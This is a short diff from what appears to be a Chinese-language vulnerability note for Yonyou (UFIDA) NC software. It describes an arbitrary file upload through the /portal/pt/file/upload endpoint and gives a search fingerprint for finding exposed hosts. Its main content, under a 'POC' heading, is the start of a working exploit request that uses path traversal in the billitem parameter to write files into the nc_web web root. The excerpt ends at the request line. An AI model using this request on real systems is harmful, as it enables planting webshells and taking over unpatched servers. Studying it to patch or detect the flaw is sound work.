@@ -8,7 +8,7 @@ NC系统可利用/portal/pt/file/upload 接口中的 filename 参数及 billitem
 app="用友-UFIDA-NC"
 ```
 
-## poc
+## POC
 
 ```java
 POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1
